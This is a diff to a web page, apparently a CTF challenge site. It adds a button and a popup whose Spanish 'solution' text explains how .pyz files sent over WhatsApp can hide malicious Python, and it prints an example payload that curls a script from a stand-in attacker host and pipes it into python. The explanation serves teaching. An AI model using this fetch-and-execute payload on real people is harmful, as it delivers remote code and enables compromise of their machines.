@@ -297,6 +297,68 @@
     .info-content p {
       margin: 4px 0;
     }
+    
+ .solution-button {
+  position: absolute;
+  bottom: 20px;
+  right: 20px;
+  background-color: #00bcd4;
+  color: white;
+  border: none;
+  border-radius: 50%;
+  padding: 12px;
+  font-size: 20px;
+  cursor: pointer;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+  transition: background-color 0.3s ease;
+}
+
+.solution-button:hover {
+  background-color: #0097a7;
+}
+
+.popup-solucion {
+  display: none;
+  position: fixed;
+  z-index: 9999;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0,0,0,0.7);
+}
+
+.popup-solucion-content {
+  background-color: #111;
+  color: white;
+  margin: auto;
+  padding: 20px;
+  border-radius: 10px;
+  width: 80%;
+  max-width: 500px;
+  position: relative;
+  top: 50%;
+  transform: translateY(-50%);
+}
+
+.popup-solucion pre {
+  background: #2d2d2d;
+  padding: 10px;
+  border-radius: 5px;
+  overflow-x: auto;
+}
+
+.close-solucion {
+  position: absolute;
+  top: 10px;
+  right: 15px;
+  font-size: 24px;
+  cursor: pointer;
+  color: #fdd835;
+}
+
+
+    
 
     .action-buttons {
       display: flex;
@@ -451,6 +513,7 @@
               🎥<span>Video</span>
             </button>
           </div>
+          <button id="show-solution-btn" class="solution-button">💡</button>
         </div>
       </div>
     </div>
@@ -567,7 +630,52 @@
     // Limpiar el input para permitir volver a cargar el mismo archivo si se quiere
     event.target.value = "";
   }
+  
+  // boton mostrar solucion
+  window.addEventListener('DOMContentLoaded', () => {
+    const showSolutionBtn = document.getElementById('show-solution-btn');
+    const solucionPopup = document.getElementById('solucion-popup');
+    const closeSolucion = document.querySelector('.close-solucion');
+
+    // Abrir popup de solución
+    if (showSolutionBtn && solucionPopup) {
+      showSolutionBtn.addEventListener('click', () => {
+        solucionPopup.style.display = 'block';
+      });
+    }
+
+    // Cerrar popup de solución
+    if (closeSolucion) {
+      closeSolucion.addEventListener('click', () => {
+        solucionPopup.style.display = 'none';
+      });
+    }
+
+    // Cerrar haciendo clic fuera del contenido
+    window.addEventListener('click', (e) => {
+      if (e.target === solucionPopup) {
+        solucionPopup.style.display = 'none';
+      }
+    });
+  });
+
+
 </script>
+<div id="solucion-popup" class="popup-solucion">
+  <div class="popup-solucion-content">
+    <span class="close-solucion">&times;</span>
+    <h2>Solucion</h2>
+    <p>
+      WhatsApp permite enviar archivos con extensión <code>.pyz</code>, que son ejecutables en sistemas con Python. Esta extensión puede camuflar scripts maliciosos y, si el usuario los ejecuta, podría permitir la ejecución remota de código (RCE).
+    </p>
+    <p><strong>Ejemplo de payload:</strong></p>
+    <pre><code>import os
+os.system("curl http://attacker.com/shell.py | python")</code></pre>
+    <p>
+      En un CTF, esta vulnerabilidad puede explotarse enseñando cómo un archivo aparentemente inofensivo puede ejecutar código remoto si se abre sin verificar.
+    </p>
+  </div>
+</div>
 
 </body>
 </html>
